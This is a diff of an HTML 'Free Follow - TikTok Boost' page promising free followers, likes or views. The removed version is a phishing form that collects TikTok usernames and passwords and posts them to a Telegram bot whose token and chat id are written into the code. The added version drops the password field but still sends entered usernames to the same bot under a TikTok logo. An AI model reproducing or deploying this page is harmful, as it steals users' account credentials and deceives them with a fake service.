@@ -1,100 +1,78 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Free Follow</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Folo - TikTok Boost</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      background-color: #000;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      color: white;
-    }
-
-    .container {
+      font-family: sans-serif;
       background-color: #111;
-      padding: 25px;
-      border-radius: 15px;
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
-      width: 90%;
-      max-width: 400px;
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      color: #ff4444;
-    }
-
-    input, select, button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      background-color: #222;
       color: white;
+      text-align: center;
+      padding: 20px;
     }
-
+    img.logo {
+      width: 100px;
+      margin-bottom: 10px;
+    }
+    h1 {
+      font-size: 30px;
+      margin: 10px 0 20px;
+    }
+    input, select, button {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      font-size: 16px;
+      width: 80%;
+      max-width: 300px;
+      border-radius: 10px;
+      border: none;
+    }
     button {
-      background-color: #ff0033;
+      background-color: #ff0050;
       color: white;
       font-weight: bold;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #ff3366;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>🔥 Free Follow - TikTok Boost</h2>
-    <input type="text" id="username" placeholder="اسم مستخدم تيك توك" required>
-    <input type="password" id="password" placeholder="كلمة المرور (تأكد من صحتها)" required>
-    <select id="amount" required>
-      <option value="">-- اختر عدد المتابعين --</option>
-      <option value="1000">1000</option>
-      <option value="2000">2000</option>
-      <option value="5000">5000</option>
-    </select>
-    <select id="type" required>
-      <option value="">-- اختر النوع --</option>
-      <option value="متابعين">متابعين</option>
-      <option value="لايكات">لايكات</option>
-      <option value="مشاهدات">مشاهدات</option>
-    </select>
-    <button onclick="sendData()">ابدأ الرشق الآن</button>
-  </div>
+
+  <!-- ✅ شعار تيك توك -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/TikTok_logo.svg" alt="TikTok Logo" class="logo" />
+
+  <h1>Free Folo</h1>
+
+  <input type="text" id="username" placeholder="TikTok Username" />
+
+  <select id="amount">
+    <option value="1000">1000</option>
+    <option value="2000">2000</option>
+    <option value="5000">5000</option>
+  </select>
+
+  <select id="type">
+    <option value="followers">Followers</option>
+    <option value="likes">Likes</option>
+    <option value="views">Views</option>
+  </select>
+
+  <button onclick="send()">تم</button>
 
   <script>
-    async function sendData() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const amount = document.getElementById('amount').value;
-      const type = document.getElementById('type').value;
-      if (!username || !password || !amount || !type) {
-        alert('يرجى ملء جميع الحقول!');
-        return;
-      }
+    function send() {
+      const username = document.getElementById("username").value;
+      const amount = document.getElementById("amount").value;
+      const type = document.getElementById("type").value;
 
-      const message = `🧨 تيك توك جديد:\n👤 المستخدم: ${username}\n🔐 كلمة السر: ${password}\n📦 الكمية: ${amount}\n📌 النوع: ${type}`;
+      const message = `🟣 TikTok Boost Request 🟣\n\n👤 Username: ${username}\n📦 Amount: ${amount}\n🔘 Type: ${type}`;
 
-      await fetch('https://api.telegram.org/bot7522052271:AAHa6XIscaA7ivTn_C0Wr8oaqritL0GP8EY/sendMessage', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: '6454073193', text: message })
-      });
-
-      alert('تمت الإرسال بنجاح!');
+      fetch(`https://api.telegram.org/bot7522052271:AAHa6XIscaA7ivTn_C0Wr8oaqritL0GP8EY/sendMessage?chat_id=6454073193&text=${encodeURIComponent(message)}`);
+      
+      alert("تم الإرسال ✅");
     }
   </script>
+
 </body>
 </html>
